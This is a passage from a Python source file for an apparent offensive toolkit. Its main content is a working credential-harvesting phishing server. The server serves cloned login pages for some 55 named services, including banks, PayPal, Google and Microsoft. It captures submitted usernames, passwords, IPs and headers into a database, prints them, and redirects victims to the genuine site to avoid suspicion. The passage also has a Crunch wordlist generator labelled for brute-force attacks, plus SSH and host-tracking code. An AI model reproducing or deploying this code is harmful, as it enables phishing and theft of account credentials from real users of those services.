            self._update_stats(datetime.datetime.now().strftime('%Y-%m-%d'), 'clicks')
        except Exception as e:
            logger.error(f"Failed to update clicks: {e}")
    
    def save_captured_credential(self, link_id: str, username: str, password: str,
                                 ip_address: str, user_agent: str, additional_data: str = "") -> bool:
        """Save captured credentials"""
        try:
            email = username if '@' in username else None
            
            self.cursor.execute('''
                INSERT INTO captured_credentials 
                (link_id, username, password, email, ip_address, user_agent, additional_data)
                VALUES (?, ?, ?, ?, ?, ?, ?)
            ''', (link_id, username, password, email, ip_address, user_agent, additional_data))
            self.conn.commit()
            
            self.cursor.execute('UPDATE phishing_links SET captures = captures + 1 WHERE id = ?', (link_id,))
            self.conn.commit()
            
            self._update_stats(datetime.datetime.now().strftime('%Y-%m-%d'), 'captures')
            
            logger.info(f"Credentials captured for link {link_id} from {ip_address}")
            return True
        except Exception as e:
            logger.error(f"Failed to save captured credentials: {e}")
            return False
    
    def get_captured_credentials(self, link_id: Optional[str] = None) -> List[Dict]:
        """Get captured credentials"""
        try:
            if link_id:
                self.cursor.execute('''
                    SELECT * FROM captured_credentials WHERE link_id = ? ORDER BY timestamp DESC
                ''', (link_id,))
            else:
                self.cursor.execute('SELECT * FROM captured_credentials ORDER BY timestamp DESC LIMIT 100')
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get captured credentials: {e}")
            return []
    
    def get_templates(self, platform: str = None, category: str = None) -> List[Dict]:
        """Get phishing templates with filters"""
        try:
            query = "SELECT * FROM phishing_templates"
            params = []
            
            if platform or category:
                query += " WHERE 1=1"
            
            if platform:
                query += " AND platform LIKE ?"
                params.append(f"%{platform}%")
            
            if category:
                query += " AND category = ?"
                params.append(category)
            
            query += " ORDER BY platform, name"
            
            self.cursor.execute(query, params)
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get templates: {e}")
            return []
    
    def get_template(self, name: str) -> Optional[Dict]:
        """Get specific template by name"""
        try:
            self.cursor.execute('SELECT * FROM phishing_templates WHERE name = ?', (name,))
            row = self.cursor.fetchone()
            return dict(row) if row else None
        except Exception as e:
            logger.error(f"Failed to get template: {e}")
            return None
    
    def get_categories(self) -> List[Dict]:
        """Get all platform categories"""
        try:
            self.cursor.execute('SELECT * FROM platform_categories ORDER BY name')
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get categories: {e}")
            return []
    
    def get_platforms_by_category(self, category: str) -> List[str]:
        """Get all platforms in a category"""
        try:
            self.cursor.execute('''
                SELECT DISTINCT platform FROM phishing_templates 
                WHERE category = ? ORDER BY platform
            ''', (category,))
            return [row['platform'] for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get platforms: {e}")
            return []
    
    def get_stats(self) -> Dict:
        """Get phishing statistics"""
        stats = {
            'total_links': 0,
            'total_clicks': 0,
            'total_captures': 0,
            'active_links': 0,
            'by_category': {},
            'recent_activity': []
        }
        
        try:
            self.cursor.execute('''
                SELECT COUNT(*) as count, SUM(clicks) as clicks, SUM(captures) as captures
                FROM phishing_links
            ''')
            row = self.cursor.fetchone()
            if row:
                stats['total_links'] = row['count'] or 0
                stats['total_clicks'] = row['clicks'] or 0
                stats['total_captures'] = row['captures'] or 0
            
            self.cursor.execute('SELECT COUNT(*) FROM phishing_links WHERE active = 1')
            stats['active_links'] = self.cursor.fetchone()[0] or 0
            
            self.cursor.execute('''
                SELECT platform_category, COUNT(*) as count 
                FROM phishing_links GROUP BY platform_category
            ''')
            for row in self.cursor.fetchall():
                stats['by_category'][row['platform_category']] = row['count']
            
            self.cursor.execute('''
                SELECT timestamp, username, link_id FROM captured_credentials 
                ORDER BY timestamp DESC LIMIT 10
            ''')
            stats['recent_activity'] = [dict(row) for row in self.cursor.fetchall()]
            
        except Exception as e:
            logger.error(f"Failed to get stats: {e}")
        
        return stats
    
    def _update_stats(self, date: str, field: str):
        """Update daily statistics"""
        try:
            self.cursor.execute('''
                INSERT INTO phishing_stats (date, total_links, total_clicks, total_captures)
                VALUES (?, 0, 0, 0) ON CONFLICT(date) DO NOTHING
            ''', (date,))
            
            if field == 'links':
                self.cursor.execute('UPDATE phishing_stats SET total_links = total_links + 1 WHERE date = ?', (date,))
            elif field == 'clicks':
                self.cursor.execute('UPDATE phishing_stats SET total_clicks = total_clicks + 1 WHERE date = ?', (date,))
            elif field == 'captures':
                self.cursor.execute('UPDATE phishing_stats SET total_captures = total_captures + 1 WHERE date = ?', (date,))
            
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to update stats: {e}")
    
    # ==================== Workspace Methods ====================
    
    def create_default_workspace(self):
        """Create default workspace"""
        try:
            self.cursor.execute('''
                INSERT OR IGNORE INTO workspaces (name, description, active)
                VALUES ('default', 'Default workspace', 1)
            ''')
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to create default workspace: {e}")
    
    def get_active_workspace(self) -> Optional[Dict]:
        """Get active workspace"""
        try:
            self.cursor.execute('SELECT * FROM workspaces WHERE active = 1')
            row = self.cursor.fetchone()
            return dict(row) if row else None
        except Exception as e:
            logger.error(f"Failed to get active workspace: {e}")
            return None
    
    def set_active_workspace(self, name: str) -> bool:
        """Set active workspace"""
        try:
            self.cursor.execute('UPDATE workspaces SET active = 0')
            self.cursor.execute('UPDATE workspaces SET active = 1 WHERE name = ?', (name,))
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to set active workspace: {e}")
            return False
    
    def add_host(self, ip: str, hostname: str = None, os_info: str = None,
                mac: str = None, vendor: str = None) -> Optional[int]:
        """Add host to database"""
        try:
            workspace = self.get_active_workspace()
            if not workspace:
                return None
            
            self.cursor.execute('''
                INSERT OR REPLACE INTO hosts 
                (workspace_id, ip_address, hostname, os_info, mac_address, vendor, last_seen)
                VALUES (?, ?, ?, ?, ?, ?, CURRENT_TIMESTAMP)
            ''', (workspace['id'], ip, hostname, os_info, mac, vendor))
            self.conn.commit()
            return self.cursor.lastrowid
        except Exception as e:
            logger.error(f"Failed to add host: {e}")
            return None
    
    def get_hosts(self, workspace: str = None) -> List[Dict]:
        """Get hosts from database"""
        try:
            if workspace:
                self.cursor.execute('''
                    SELECT h.* FROM hosts h
                    JOIN workspaces w ON h.workspace_id = w.id
                    WHERE w.name = ? ORDER BY h.ip_address
                ''', (workspace,))
            else:
                workspace = self.get_active_workspace()
                if workspace:
                    self.cursor.execute('SELECT * FROM hosts WHERE workspace_id = ? ORDER BY ip_address', 
                                      (workspace['id'],))
                else:
                    return []
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get hosts: {e}")
            return []
    
    # ==================== SSH Methods ====================
    
    def add_ssh_server(self, server: SSHServer) -> bool:
        """Add SSH server to database"""
        try:
            self.cursor.execute('''
                INSERT OR REPLACE INTO ssh_servers 
                (id, name, host, port, username, password, key_file, use_key, timeout, notes, created_at)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            ''', (server.id, server.name, server.host, server.port, server.username,
                  server.password, server.key_file, server.use_key, server.timeout,
                  server.notes, server.created_at or datetime.datetime.now().isoformat()))
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to add SSH server: {e}")
            return False
    
    def get_ssh_servers(self) -> List[Dict]:
        """Get all SSH servers"""
        try:
            self.cursor.execute('SELECT * FROM ssh_servers ORDER BY name')
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get SSH servers: {e}")
            return []
    
    def get_ssh_server(self, server_id: str) -> Optional[Dict]:
        """Get SSH server by ID"""
        try:
            self.cursor.execute('SELECT * FROM ssh_servers WHERE id = ?', (server_id,))
            row = self.cursor.fetchone()
            return dict(row) if row else None
        except Exception as e:
            logger.error(f"Failed to get SSH server: {e}")
            return None
    
    def delete_ssh_server(self, server_id: str) -> bool:
        """Delete SSH server"""
        try:
            self.cursor.execute('DELETE FROM ssh_servers WHERE id = ?', (server_id,))
            self.conn.commit()
            return self.cursor.rowcount > 0
        except Exception as e:
            logger.error(f"Failed to delete SSH server: {e}")
            return False
    
    def log_ssh_command(self, server_id: str, server_name: str, command: str,
                       success: bool, output: str, error: str = None,
                       execution_time: float = 0.0, executed_by: str = "system"):
        """Log SSH command execution"""
        try:
            self.cursor.execute('''
                INSERT INTO ssh_commands 
                (server_id, server_name, command, success, output, error, execution_time, executed_by)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?)
            ''', (server_id, server_name, command, success, output[:5000], 
                  error[:500] if error else None, execution_time, executed_by))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to log SSH command: {e}")
    
    # ==================== Crunch Methods ====================
    
    def save_crunch_wordlist(self, wordlist: CrunchWordlist) -> bool:
        """Save crunch wordlist to database"""
        try:
            self.cursor.execute('''
                INSERT OR REPLACE INTO crunch_wordlists 
                (id, name, filename, min_length, max_length, charset, pattern, file_size, line_count, created_at, status)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            ''', (wordlist.id, wordlist.name, wordlist.filename, wordlist.min_length,
                  wordlist.max_length, wordlist.charset, wordlist.pattern,
                  wordlist.file_size, wordlist.line_count, wordlist.created_at, wordlist.status))
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to save crunch wordlist: {e}")
            return False
    
    def get_crunch_wordlists(self) -> List[Dict]:
        """Get all crunch wordlists"""
        try:
            self.cursor.execute('SELECT * FROM crunch_wordlists ORDER BY created_at DESC')
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get crunch wordlists: {e}")
            return []
    
    def get_crunch_wordlist(self, wordlist_id: str) -> Optional[Dict]:
        """Get crunch wordlist by ID"""
        try:
            self.cursor.execute('SELECT * FROM crunch_wordlists WHERE id = ?', (wordlist_id,))
            row = self.cursor.fetchone()
            return dict(row) if row else None
        except Exception as e:
            logger.error(f"Failed to get crunch wordlist: {e}")
            return None
    
    def delete_crunch_wordlist(self, wordlist_id: str) -> bool:
        """Delete crunch wordlist from database"""
        try:
            self.cursor.execute('DELETE FROM crunch_wordlists WHERE id = ?', (wordlist_id,))
            self.conn.commit()
            return self.cursor.rowcount > 0
        except Exception as e:
            logger.error(f"Failed to delete crunch wordlist: {e}")
            return False
    
    # ==================== Traffic Log Methods ====================
    
    def log_traffic(self, generator: TrafficGenerator, executed_by: str = "system"):
        """Log traffic generation"""
        try:
            self.cursor.execute('''
                INSERT INTO traffic_logs 
                (traffic_type, target_ip, target_port, duration, packets_sent, bytes_sent, status, executed_by, error)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
            ''', (generator.traffic_type, generator.target_ip, generator.target_port,
                  generator.duration, generator.packets_sent, generator.bytes_sent,
                  generator.status, executed_by, generator.error))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to log traffic: {e}")
    
    def get_traffic_logs(self, limit: int = 20) -> List[Dict]:
        """Get recent traffic generation logs"""
        try:
            self.cursor.execute('SELECT * FROM traffic_logs ORDER BY timestamp DESC LIMIT ?', (limit,))
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get traffic logs: {e}")
            return []
    
    # ==================== Threat Methods ====================
    
    def log_threat(self, alert: ThreatAlert):
        """Log threat alert"""
        try:
            self.cursor.execute('''
                INSERT INTO threats (timestamp, threat_type, source_ip, severity, description, action_taken)
                VALUES (?, ?, ?, ?, ?, ?)
            ''', (alert.timestamp, alert.threat_type, alert.source_ip,
                  alert.severity, alert.description, alert.action_taken))
            self.conn.commit()
            logger.info(f"Threat logged: {alert.threat_type} from {alert.source_ip}")
        except Exception as e:
            logger.error(f"Failed to log threat: {e}")
    
    def get_recent_threats(self, limit: int = 10) -> List[Dict]:
        """Get recent threats"""
        try:
            self.cursor.execute('SELECT * FROM threats ORDER BY timestamp DESC LIMIT ?', (limit,))
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get threats: {e}")
            return []
    
    def get_threats_by_ip(self, ip: str, limit: int = 10) -> List[Dict]:
        """Get threats for specific IP"""
        try:
            self.cursor.execute('''
                SELECT * FROM threats WHERE source_ip = ? ORDER BY timestamp DESC LIMIT ?
            ''', (ip, limit))
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get threats by IP: {e}")
            return []
    
    # ==================== IP Management Methods ====================
    
    def add_managed_ip(self, ip: str, added_by: str = "system", notes: str = "") -> bool:
        """Add IP to management"""
        try:
            ipaddress.ip_address(ip)
            self.cursor.execute('''
                INSERT OR IGNORE INTO managed_ips (ip_address, added_by, notes, added_date)
                VALUES (?, ?, ?, CURRENT_TIMESTAMP)
            ''', (ip, added_by, notes))
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to add managed IP: {e}")
            return False
    
    def remove_managed_ip(self, ip: str) -> bool:
        """Remove IP from management"""
        try:
            self.cursor.execute('DELETE FROM managed_ips WHERE ip_address = ?', (ip,))
            self.conn.commit()
            return self.cursor.rowcount > 0
        except Exception as e:
            logger.error(f"Failed to remove managed IP: {e}")
            return False
    
    def block_ip(self, ip: str, reason: str, executed_by: str = "system") -> bool:
        """Mark IP as blocked"""
        try:
            self.cursor.execute('''
                UPDATE managed_ips 
                SET is_blocked = 1, block_reason = ?, blocked_date = CURRENT_TIMESTAMP
                WHERE ip_address = ?
            ''', (reason, ip))
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to block IP: {e}")
            return False
    
    def unblock_ip(self, ip: str, executed_by: str = "system") -> bool:
        """Unblock IP"""
        try:
            self.cursor.execute('''
                UPDATE managed_ips 
                SET is_blocked = 0, block_reason = NULL, blocked_date = NULL
                WHERE ip_address = ?
            ''', (ip,))
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to unblock IP: {e}")
            return False
    
    def get_managed_ips(self, include_blocked: bool = True) -> List[Dict]:
        """Get managed IPs"""
        try:
            if include_blocked:
                self.cursor.execute('SELECT * FROM managed_ips ORDER BY added_date DESC')
            else:
                self.cursor.execute('SELECT * FROM managed_ips WHERE is_blocked = 0 ORDER BY added_date DESC')
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get managed IPs: {e}")
            return []
    
    def get_ip_info(self, ip: str) -> Optional[Dict]:
        """Get information about a specific IP"""
        try:
            self.cursor.execute('SELECT * FROM managed_ips WHERE ip_address = ?', (ip,))
            row = self.cursor.fetchone()
            return dict(row) if row else None
        except Exception as e:
            logger.error(f"Failed to get IP info: {e}")
            return None
    
    # ==================== Command History ====================
    
    def log_command(self, command: str, source: str = "local", success: bool = True,
                   output: str = "", execution_time: float = 0.0):
        """Log command execution"""
        try:
            self.cursor.execute('''
                INSERT INTO command_history (command, source, success, output, execution_time)
                VALUES (?, ?, ?, ?, ?)
            ''', (command, source, success, output[:5000], execution_time))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to log command: {e}")
    
    def get_command_history(self, limit: int = 20) -> List[Dict]:
        """Get command history"""
        try:
            self.cursor.execute('''
                SELECT command, source, timestamp, success FROM command_history 
                ORDER BY timestamp DESC LIMIT ?
            ''', (limit,))
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get command history: {e}")
            return []
    
    # ==================== Platform Status ====================
    
    def update_platform_status(self, platform: str, enabled: bool, status: str, error: str = None):
        """Update platform integration status"""
        try:
            self.cursor.execute('''
                INSERT OR REPLACE INTO platform_status (platform, enabled, last_connected, status, error)
                VALUES (?, ?, CURRENT_TIMESTAMP, ?, ?)
            ''', (platform, enabled, status, error))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to update platform status: {e}")
    
    def get_platform_status(self) -> List[Dict]:
        """Get all platform statuses"""
        try:
            self.cursor.execute('SELECT * FROM platform_status')
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get platform status: {e}")
            return []
    
    # ==================== Nikto Scans ====================
    
    def log_nikto_scan(self, target: str, vulnerabilities: List[Dict], output_file: str,
                      scan_time: float, success: bool = True):
        """Log Nikto scan results"""
        try:
            vulns_json = json.dumps(vulnerabilities) if vulnerabilities else "[]"
            self.cursor.execute('''
                INSERT INTO nikto_scans (target, vulnerabilities, output_file, scan_time, success, timestamp)
                VALUES (?, ?, ?, ?, ?, CURRENT_TIMESTAMP)
            ''', (target, vulns_json, output_file, scan_time, success))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to log Nikto scan: {e}")
    
    def get_nikto_scans(self, limit: int = 10) -> List[Dict]:
        """Get recent Nikto scans"""
        try:
            self.cursor.execute('SELECT * FROM nikto_scans ORDER BY timestamp DESC LIMIT ?', (limit,))
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get Nikto scans: {e}")
            return []
    
    # ==================== Statistics ====================
    
    def get_statistics(self) -> Dict:
        """Get database statistics"""
        stats = {}
        try:
            self.cursor.execute('SELECT COUNT(*) FROM threats')
            stats['total_threats'] = self.cursor.fetchone()[0]
            
            self.cursor.execute('SELECT COUNT(*) FROM command_history')
            stats['total_commands'] = self.cursor.fetchone()[0]
            
            self.cursor.execute('SELECT COUNT(*) FROM ssh_servers')
            stats['total_ssh_servers'] = self.cursor.fetchone()[0]
            
            self.cursor.execute('SELECT COUNT(*) FROM ssh_commands')
            stats['total_ssh_commands'] = self.cursor.fetchone()[0]
            
            self.cursor.execute('SELECT COUNT(*) FROM managed_ips')
            stats['total_managed_ips'] = self.cursor.fetchone()[0]
            
            self.cursor.execute('SELECT COUNT(*) FROM managed_ips WHERE is_blocked = 1')
            stats['total_blocked_ips'] = self.cursor.fetchone()[0]
            
            self.cursor.execute('SELECT COUNT(*) FROM traffic_logs')
            stats['total_traffic_tests'] = self.cursor.fetchone()[0]
            
            self.cursor.execute('SELECT COUNT(*) FROM phishing_links WHERE active = 1')
            stats['active_phishing_links'] = self.cursor.fetchone()[0]
            
            self.cursor.execute('SELECT COUNT(*) FROM captured_credentials')
            stats['captured_credentials'] = self.cursor.fetchone()[0]
            
            self.cursor.execute('SELECT COUNT(*) FROM crunch_wordlists')
            stats['total_crunch_wordlists'] = self.cursor.fetchone()[0]
            
            self.cursor.execute('SELECT COUNT(*) FROM nikto_scans')
            stats['total_nikto_scans'] = self.cursor.fetchone()[0]
            
        except Exception as e:
            logger.error(f"Failed to get statistics: {e}")
        
        return stats
    
    # ==================== Session Management ====================
    
    def create_session(self, user_name: str = None) -> str:
        """Create new user session"""
        try:
            session_id = str(uuid.uuid4())[:8]
            self.cursor.execute('''
                INSERT INTO user_sessions (session_id, user_name)
                VALUES (?, ?)
            ''', (session_id, user_name))
            self.conn.commit()
            return session_id
        except Exception as e:
            logger.error(f"Failed to create session: {e}")
            return None
    
    def update_session_activity(self, session_id: str):
        """Update session activity"""
        try:
            self.cursor.execute('''
                UPDATE user_sessions 
                SET last_activity = CURRENT_TIMESTAMP, commands_count = commands_count + 1
                WHERE session_id = ? AND active = 1
            ''', (session_id,))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to update session: {e}")
    
    def end_session(self, session_id: str):
        """End user session"""
        try:
            self.cursor.execute('''
                UPDATE user_sessions SET active = 0, last_activity = CURRENT_TIMESTAMP
                WHERE session_id = ?
            ''', (session_id,))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to end session: {e}")
    
    def get_sessions(self, active_only: bool = True) -> List[Dict]:
        """Get user sessions"""
        try:
            if active_only:
                self.cursor.execute('SELECT * FROM user_sessions WHERE active = 1 ORDER BY start_time DESC')
            else:
                self.cursor.execute('SELECT * FROM user_sessions ORDER BY start_time DESC')
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get sessions: {e}")
            return []
    
    def close(self):
        """Close database connection"""
        try:
            if self.conn:
                self.conn.close()
        except Exception as e:
            logger.error(f"Error closing database: {e}")


# =====================
# PHISHING REQUEST HANDLER
# =====================
class PhishingRequestHandler(BaseHTTPRequestHandler):
    """HTTP request handler for phishing pages"""
    
    server_instance = None
    db = None
    
    def log_message(self, format, *args):
        pass
    
    def do_GET(self):
        """Handle GET requests"""
        try:
            if self.path == '/' or self.path == '/index.html':
                self.send_phishing_page()
            elif self.path == '/favicon.ico':
                self.send_response(204)
                self.end_headers()
            else:
                self.send_response(404)
                self.end_headers()
        except Exception as e:
            logger.error(f"Error handling GET request: {e}")
            self.send_error(500)
    
    def do_POST(self):
        """Handle POST requests (form submissions)"""
        try:
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length).decode('utf-8')
            
            form_data = urllib.parse.parse_qs(post_data)
            
            username = (form_data.get('email', form_data.get('username', 
                       form_data.get('user', form_data.get('login', [''])))[0]))
            password = form_data.get('password', [''])[0]
            
            client_ip = self.client_address[0]
            user_agent = self.headers.get('User-Agent', 'Unknown')
            
            if self.db and hasattr(self, 'link_id'):
                self.db.save_captured_credential(
                    self.link_id,
                    username,
                    password,
                    client_ip,
                    user_agent,
                    json.dumps(dict(self.headers))
                )
                
                print(f"\n{Colors.RED}🎣 CREDENTIALS CAPTURED!{Colors.RESET}")
                print(f"{Colors.YELLOW}📧 Details:{Colors.RESET}")
                print(f"  Link ID: {self.link_id}")
                print(f"  Platform: {self.platform}")
                print(f"  IP: {client_ip}")
                print(f"  Username: {username}")
                print(f"  Password: {password}")
                print(f"  User-Agent: {user_agent[:100]}...")
            
            redirect_url = self.get_redirect_url()
            
            self.send_response(302)
            self.send_header('Location', redirect_url)
            self.end_headers()
            
        except Exception as e:
            logger.error(f"Error handling POST request: {e}")
            self.send_error(500)
    
    def send_phishing_page(self):
        """Send the phishing page"""
        try:
            if hasattr(self, 'html_content') and self.html_content:
                self.send_response(200)
                self.send_header('Content-Type', 'text/html; charset=utf-8')
                self.end_headers()
                self.wfile.write(self.html_content.encode('utf-8'))
                
                if self.db and hasattr(self, 'link_id'):
                    self.db.update_phishing_link_clicks(self.link_id)
                    print(f"{Colors.CYAN}📊 Click detected on link {self.link_id} from {self.client_address[0]}{Colors.RESET}")
            else:
                self.send_error(404, "Page not found")
        except Exception as e:
            logger.error(f"Error sending phishing page: {e}")
            self.send_error(500)
    
    def get_redirect_url(self) -> str:
        """Get redirect URL based on platform"""
        redirects = {
            'Facebook': 'https://www.facebook.com',
            'Instagram': 'https://www.instagram.com',
            'Snapchat': 'https://www.snapchat.com',
            'Twitter (X)': 'https://twitter.com',
            'LinkedIn': 'https://www.linkedin.com',
            'Pinterest': 'https://www.pinterest.com',
            'Badoo': 'https://badoo.com',
            'TikTok': 'https://www.tiktok.com',
            'Reddit': 'https://www.reddit.com',
            'Discord': 'https://discord.com',
            'eBay': 'https://www.ebay.com',
            'Amazon': 'https://www.amazon.com',
            'AliExpress': 'https://www.aliexpress.com',
            'Etsy': 'https://www.etsy.com',
            'Walmart': 'https://www.walmart.com',
            'Target': 'https://www.target.com',
            'Best Buy': 'https://www.bestbuy.com',
            'Shopify': 'https://www.shopify.com',
            'Google': 'https://accounts.google.com',
            'Gmail': 'https://mail.google.com',
            'Microsoft': 'https://login.microsoftonline.com',
            'Outlook': 'https://outlook.live.com',
            'GitHub': 'https://github.com',
            'Yahoo': 'https://login.yahoo.com',
            'ProtonMail': 'https://mail.protonmail.com',
            'WordPress': 'https://wordpress.com',
            'Dropbox': 'https://www.dropbox.com',
            'OneDrive': 'https://onedrive.live.com',
            'Box': 'https://account.box.com',
            'Steam': 'https://store.steampowered.com',
            'Origin': 'https://www.origin.com',
            'Epic Games': 'https://www.epicgames.com',
            'Roblox': 'https://www.roblox.com',
            'Minecraft': 'https://www.minecraft.net',
            'Ubisoft': 'https://ubisoftconnect.com',
            'Battle.net': 'https://account.battle.net',
            'Twitch': 'https://www.twitch.tv',
            'Netflix': 'https://www.netflix.com',
            'Spotify': 'https://www.spotify.com',
            'Hulu': 'https://www.hulu.com',
            'Disney+': 'https://www.disneyplus.com',
            'HBO Max': 'https://www.hbomax.com',
            'Peacock': 'https://www.peacocktv.com',
            'Paramount+': 'https://www.paramountplus.com',
            'PayPal': 'https://www.paypal.com',
            'Venmo': 'https://venmo.com',
            'Cash App': 'https://cash.app',
            'Chase': 'https://secure.chase.com',
            'Wells Fargo': 'https://www.wellsfargo.com',
            'Bank of America': 'https://www.bankofamerica.com',
            'Adobe': 'https://account.adobe.com',
            'Canva': 'https://www.canva.com',
            'Figma': 'https://www.figma.com',
            'Modern': 'https://www.google.com',
            'Corporate': 'https://www.google.com',
            'Custom': 'https://www.google.com'
        }
        
        return redirects.get(getattr(self, 'platform', ''), 'https://www.google.com')


# =====================
# PHISHING SERVER
# =====================
class PhishingServer:
    """HTTP server for hosting phishing pages"""
    
    def __init__(self, db: DatabaseManager):
        self.db = db
        self.server = None
        self.server_thread = None
        self.running = False
        self.port = 8080
        self.link_id = None
        self.platform = None
        self.html_content = None
        self.host = '0.0.0.0'
    
    def start(self, link_id: str, platform: str, html_content: str, port: int = 8080) -> bool:
        """Start phishing server"""
        try:
            self.link_id = link_id
            self.platform = platform
            self.html_content = html_content
            self.port = port
            
            handler = PhishingRequestHandler
            handler.server_instance = self
            handler.db = self.db
            handler.link_id = link_id
            handler.platform = platform
            handler.html_content = html_content
            
            self.server = socketserver.TCPServer((self.host, port), handler)
            self.server_thread = threading.Thread(target=self.server.serve_forever, daemon=True)
            self.server_thread.start()
            self.running = True
            
            local_ip = self._get_local_ip()
            logger.info(f"Phishing server started on {local_ip}:{port}")
            print(f"\n{Colors.GREEN}✅ Phishing server started!{Colors.RESET}")
            print(f"{Colors.CYAN}📡 URL: http://{local_ip}:{port}{Colors.RESET}")
            print(f"{Colors.CYAN}🎯 Platform: {platform}{Colors.RESET}")
            print(f"{Colors.CYAN}🔗 Link ID: {link_id}{Colors.RESET}")
            print(f"{Colors.YELLOW}⚠️ Press Ctrl+C to stop the server{Colors.RESET}\n")
            
            return True
            
        except Exception as e:
            logger.error(f"Failed to start phishing server: {e}")
            print(f"{Colors.RED}❌ Failed to start phishing server: {e}{Colors.RESET}")
            return False
    
    def stop(self):
        """Stop phishing server"""
        if self.server:
            self.server.shutdown()
            self.server.server_close()
            self.running = False
            logger.info("Phishing server stopped")
            print(f"\n{Colors.YELLOW}🛑 Phishing server stopped{Colors.RESET}")
    
    def get_url(self) -> str:
        """Get server URL"""
        local_ip = self._get_local_ip()
        return f"http://{local_ip}:{self.port}"
    
    def _get_local_ip(self) -> str:
        """Get local IP address"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"


# =====================
# CRUNCH WORDLIST GENERATOR
# =====================
class CrunchGenerator:
    """Crunch wordlist generator for brute force attacks"""
    
    def __init__(self, db: DatabaseManager, config: Dict = None):
        self.db = db
        self.config = config or {}
        self.crunch_available = shutil.which('crunch') is not None
        
        self.charsets = {
            CrunchPattern.LOWER: "abcdefghijklmnopqrstuvwxyz",
            CrunchPattern.UPPER: "ABCDEFGHIJKLMNOPQRSTUVWXYZ",
            CrunchPattern.MIXED: "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ",
            CrunchPattern.NUMERIC: "0123456789",
            CrunchPattern.ALPHANUM: "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789",
            CrunchPattern.SPECIAL: "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()_-+=[]{}|\\:;\"'<>,.?/~`",
            CrunchPattern.HEX: "0123456789abcdef"
        }
        
        self.max_size_mb = self.config.get('crunch', {}).get('max_wordlist_size_mb', 100)
        self.max_line_count = self.config.get('crunch', {}).get('max_line_count', 10000000)
    
    def generate_wordlist(self, name: str, min_length: int, max_length: int, 
                          pattern: str = None, charset: str = None) -> Dict[str, Any]:
        """Generate wordlist using crunch or fallback method"""
        start_time = time.time()
        
        try:
            if min_length < 1:
                return {'success': False, 'error': 'Minimum length must be at least 1'}
            if max_length < min_length:
                return {'success': False, 'error': 'Maximum length must be >= minimum length'}
            
            if not charset and pattern and pattern in self.charsets:
                charset = self.charsets[pattern]
            elif not charset:
                charset = self.charsets[CrunchPattern.ALPHANUM]
            
            if self.crunch_available:
                return self._generate_with_crunch(name, min_length, max_length, charset, pattern, start_time)
            else:
                return self._generate_fallback(name, min_length, max_length, charset, pattern, start_time)
                
        except Exception as e:
            logger.error(f"Crunch generation failed: {e}")
            return {'success': False, 'error': str(e), 'execution_time': time.time() - start_time}
    
    def _generate_with_crunch(self, name: str, min_length: int, max_length: int,
                              charset: str, pattern: str, start_time: float) -> Dict[str, Any]:
        """Generate wordlist using crunch tool"""
        timestamp = int(time.time())
        filename = f"crunch_{name.replace(' ', '_')}_{min_length}-{max_length}_{timestamp}.txt"
        output_path = os.path.join(CRUNCH_OUTPUT_DIR, filename)
        
        cmd = ['crunch', str(min_length), str(max_length)]
        
        if pattern and pattern not in self.charsets:
            cmd.extend(['-t', pattern])
        else:
            cmd.append(charset)
        
        cmd.extend(['-o', output_path, '-b', f'{self.max_size_mb}mb', '-c', str(self.max_line_count)])
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=3600)
            execution_time = time.time() - start_time
            
            if result.returncode == 0:
                file_size = os.path.getsize(output_path) if os.path.exists(output_path) else 0
                line_count = self._estimate_line_count(charset, min_length, max_length)
                
                wordlist_id = str(uuid.uuid4())[:8]
                wordlist = CrunchWordlist(
                    id=wordlist_id, name=name, filename=filename,
                    min_length=min_length, max_length=max_length,
